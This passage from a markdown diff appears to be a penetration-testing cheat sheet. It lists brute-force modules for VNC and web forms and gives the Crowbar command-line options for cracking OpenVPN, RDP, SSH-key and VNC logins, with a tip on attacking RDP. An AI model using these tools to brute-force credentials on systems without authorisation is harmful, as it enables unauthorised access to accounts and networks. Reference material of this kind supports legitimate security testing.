+| vnc.mod           | Brute force module for VNC sessions : version 2.1                                                                                                                                |
+| web-form.mod      | Brute force module for web forms : version 2.1                                                                                                                                   |
+| wrapper.mod       | Generic Wrapper Module : version 2.0                                                                                                                                             |
+
+### Crowbar
+
+Network authentication cracking tool (primarily designed to leverage SSH keys rather than pws)  
+  
+*As RDP doesn't reliably handle multiple threads, make sure to **-n 1** if you're attacking it.  
+  
+| Options                                                                 | Desc                                                               |
+| ----------------------------------------------------------------------- | ------------------------------------------------------------------ |
+| **-h**, --help                                                          | Show this help message and exit                                    |
+| **-b** {openvpn,rdp,sshkey,vnckey}, --brute {openvpn,rdp,sshkey,vnckey} | Target service                                                     |
+| **-s** SERVER, --server SERVER                                          | Static target                                                      |
+| **-S** SERVER_FILE, --serverfile SERVER_FILE                            | Multiple targets stored in a file                                  |
+| **-u** USERNAME \[USERNAME ...\], --username USERNAME \[USERNAME ...\]  | Static name to login with                                          |
+| **-U** USERNAME_FILE, --usernamefile USERNAME_FILE                      | Multiple names to login with, stored in a file                     |
+| **-n** THREAD, --number THREAD                                          | Number of threads to be active at once                             |
+| **-l** FILE, --log FILE                                                 | Log file (only write attempts)                                     |
+| **-o** FILE, --output FILE                                              | Output file (write everything else)                                |
+| **-c** PASSWD, --passwd                                                 | PASSWD Static password to login with                               |
+| **-C** FILE, --passwdfile FILE                                          | Multiple passwords to login with, stored in a file                 |
+| **-t** TIMEOUT, --timeout TIMEOUT                                       | \[SSH\] How long to wait for each thread (seconds)                 |
+| **-p** PORT, --port PORT                                                | Alter the port if the service is not using the default value       |
+| **-k** KEY_FILE, --keyfile KEY_FILE                                     | \[SSH/VNC\] (Private) Key file or folder containing multiple files |
+| **-m** CONFIG, --config CONFIG                                          | \[OpenVPN\] Configuration file                                     |
+| **-d**, --discover                                                      | Port scan before attacking open ports                              |
+| **-v**, --verbose                                                       | Enable verbose output (-vv for more)                               |
+| **-D**, --debug                                                         | Enable debug mode                                                  |
+| **-q**, --quiet                                                         | Only display successful logins                                     |
+
+
